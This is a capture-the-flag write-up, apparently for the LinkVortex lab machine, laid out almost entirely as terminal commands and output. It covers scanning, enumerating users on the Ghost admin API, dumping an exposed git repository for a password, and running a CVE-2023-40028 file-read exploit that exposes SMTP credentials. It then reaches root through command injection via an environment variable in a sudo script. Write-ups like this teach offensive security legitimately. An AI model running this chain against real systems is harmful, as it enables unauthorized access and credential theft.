# User flag
## 1. rustscan
```
# Nmap 7.94SVN scan initiated Wed Mar 12 07:36:31 2025 as: /usr/lib/nmap/nmap --privileged -vvv -p 22,80 -sC -sV -oN LinkVortex 10.129.164.202
Nmap scan report for 10.129.164.202
Host is up, received reset ttl 63 (0.22s latency).
Scanned at 2025-03-12 07:36:38 EDT for 15s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMHm4UQPajtDjitK8Adg02NRYua67JghmS5m3E+yMq2gwZZJQ/3sIDezw2DVl9trh0gUedrzkqAAG1IMi17G/HA=
|   256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKLjX3ghPjmmBL2iV1RCQV9QELEU+NF06nbXTqqj4dz
80/tcp open  http    syn-ack ttl 63 Apache httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://linkvortex.htb/
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 2. check website
```bash
1. - Powered by Ghost

# find exploit need creds
=> https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028 


2. - find a author called 'admin'

=> check if the account exists

┌──(kali㉿kali)-[~]
└─$ curl -i -s -d username="USERNAME'" -d password="PASSWORD" \
  -H "Origin: linkvortex.htb" \
    -H "Accept-Version: v3.0" \
    http://linkvortex.htb/ghost/api/v3/admin/session/

HTTP/1.1 404 Not Found
Date: Wed, 12 Mar 2025 11:46:57 GMT
Server: Apache
X-Powered-By: Express
Deprecation: version="v3"
Link: <http://linkvortex.htb/ghost/api/admin/session/>; rel="latest-version"
Content-Version: v5.58
Vary: Accept-Version,Accept-Encoding
Cache-Control: no-cache, private, no-store, must-revalidate, max-stale=0, post-check=0, pre-check=0
Content-Type: application/json; charset=utf-8
Content-Length: 227
ETag: W/"e3-tGHn+w27illmbUrEq/Sm9twVuEM"

{"errors":[{"message":"There is no user with that email address.","context":null,"type":"NotFoundError","details":null,"property":null,"help":null,"code":null,"id":"b39e12a0-ff37-11ef-96cd-2bd789c78b02","ghostErrorCode":null}]}


# if the account exists
curl -i -s -d username="admin@linkvortex.htb" -d password="PASSWORD" \
  -H "Origin: linkvortex.htb" \
    -H "Accept-Version: v3.0" \
    http://linkvortex.htb/ghost/api/v3/admin/session/

HTTP/1.1 422 Unprocessable Entity
Date: Wed, 12 Mar 2025 11:49:04 GMT
Server: Apache
X-Powered-By: Express
Deprecation: version="v3"
Link: <http://linkvortex.htb/ghost/api/admin/session/>; rel="latest-version"
Content-Version: v5.58
Vary: Accept-Version,Accept-Encoding
Cache-Control: no-cache, private, no-store, must-revalidate, max-stale=0, post-check=0, pre-check=0
Content-Type: application/json; charset=utf-8
Content-Length: 321
ETag: W/"141-WmsCc1HaGe8LTfiB0aC23VZZfzM"

{"errors":[{"message":"Your password is incorrect.","context":"Your password is incorrect.","type":"ValidationError","details":null,"property":null,"help":"Visit and save your profile after logging in to check for problems.","code":"PASSWORD_INCORRECT","id":"ff69c260-ff37-11ef-96cd-2bd789c78b02","ghostErrorCode":null}]}


3. find login page

http://linkvortex.htb/ghost/

=>http://dev.linkvortex.htb/cgi-bin/ : 403 forbidden
```

## 3. dirsearch
```python
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ dirsearch -u http://dev.linkvortex.htb
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                       
 (_||| _) (/_(_|| (_| )                                                                                                                
                                                                                                                                       
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/htb/reports/http_dev.linkvortex.htb/_25-03-16_22-50-45.txt

Target: http://dev.linkvortex.htb/

[22:50:45] Starting:                                                                                                                   
[22:51:02] 200 -   41B  - /.git/HEAD                                        
[22:51:02] 200 -  557B  - /.git/                                            
[22:51:02] 200 -   73B  - /.git/description                                 
[22:51:02] 301 -  239B  - /.git  ->  http://dev.linkvortex.htb/.git/        
[22:51:02] 200 -  201B  - /.git/config
[22:51:02] 200 -  620B  - /.git/hooks/                                      
[22:51:02] 200 -  402B  - /.git/info/       
```

## 4. git dump

```python
# virtual env
┌──(kali㉿kali)-[~/Tools/git-dumper]
└─$ python3 -m venv git_dumper    
                                                  
┌──(kali㉿kali)-[~/Tools/git-dumper]
└─$ source git_dumper/bin/activate


┌──(git_dumper)─(kali㉿kali)-[~/Tools/git-dumper]
└─$ python3 git_dumper.py http://dev.linkvortex.htb website

┌──(git_dumper)─(kali㉿kali)-[~/Tools/git-dumper/website]
└─$ ls    
Dockerfile.ghost  LICENSE  PRIVACY.md  README.md  SECURITY.md  apps  ghost  nx.json  package.json  yarn.lock

┌──(git_dumper)─(kali㉿kali)-[~/Tools/git-dumper/website]
└─$ git status                    
Not currently on any branch.
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
        new file:   Dockerfile.ghost
        modified:   ghost/core/test/regression/api/admin/authentication.test.js


┌──(git_dumper)─(kali㉿kali)-[~/Tools/git-dumper/website]
└─$ cat ghost/core/test/regression/api/admin/authentication.test.js | grep pass
            const password = 'OctopiFociPilfer45';
                        password,


┌──(kali㉿kali)-[~/Desktop/htb/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028]
└─$ ./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb

root:x:0:0:root:/root:/bin/bash
node:x:1000:1000::/home/node:/bin/bash

Enter the file path to read (or type 'exit' to quit): /var/lib/ghost/config.production.json
File content:
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}

```
## 5. ssh
```                                          
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ ssh bob@10.129.112.91 

bob@linkvortex:~$ ls
user.txt
```

# root flag
## 1. sudo -l
```bash
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

## 2. /opt/ghost/clean_symlink.sh

```bash
bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

## 3. exploit
```bash
bob@linkvortex:~$ export CHECK_CONTENT=TRUE

bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh ./test_link.png 
Link found [ ./test_link.png ] , moving it to quarantine
/opt/ghost/clean_symlink.sh: line 25: TRUE: command not found <- ** this is interesting LOL.**


bob@linkvortex:~$ export CHECK_CONTENT=bash
bob@linkvortex:~$ ln -s test.png test_link.png
bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh ./test_link.png 
Link found [ ./test_link.png ] , moving it to quarantine
root@linkvortex:/home/bob# id
uid=0(root) gid=0(root) groups=0(root)
```